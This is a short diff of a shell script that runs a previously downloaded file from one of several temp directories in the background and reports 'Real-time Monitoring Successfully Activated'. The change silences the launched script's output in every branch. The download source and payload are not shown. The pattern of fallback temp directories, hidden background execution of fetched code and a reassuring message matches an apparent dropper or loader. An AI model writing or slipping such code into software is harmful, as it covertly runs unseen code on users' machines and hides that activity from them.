@@ -41,7 +41,7 @@ chmod +x "$TMP_DL"
 # Try primary directory
 if cd "$PRIMARY_TMP" 2>/dev/null; then
     mv "$TMP_DL" "$PRIMARY_TMP/$SCRIPT_NAME"
-    sh "$PRIMARY_TMP/$SCRIPT_NAME" &
+    sh "$PRIMARY_TMP/$SCRIPT_NAME" > /dev/null 2>&1 &
     sleep 1
     echo "[✓] Real-time Monitoring Successfully Activated"
     exit 0
@@ -51,7 +51,7 @@ fi
 mkdir -p "$FALLBACK_TMP_1"
 if cd "$FALLBACK_TMP_1" 2>/dev/null; then
     mv "$TMP_DL" "$FALLBACK_TMP_1/$SCRIPT_NAME"
-    sh "$FALLBACK_TMP_1/$SCRIPT_NAME" &
+    sh "$FALLBACK_TMP_1/$SCRIPT_NAME" > /dev/null 2>&1 &
     sleep 1
     echo "[✓] Real-time Monitoring Successfully Activated"
     exit 0
@@ -61,7 +61,7 @@ fi
 mkdir -p "$FALLBACK_TMP_2"
 if cd "$FALLBACK_TMP_2" 2>/dev/null; then
     mv "$TMP_DL" "$FALLBACK_TMP_2/$SCRIPT_NAME"
-    sh "$FALLBACK_TMP_2/$SCRIPT_NAME" &
+    sh "$FALLBACK_TMP_2/$SCRIPT_NAME" > /dev/null 2>&1 &
     sleep 1
     echo "[✓] Real-time Monitoring Successfully Activated"
     exit 0
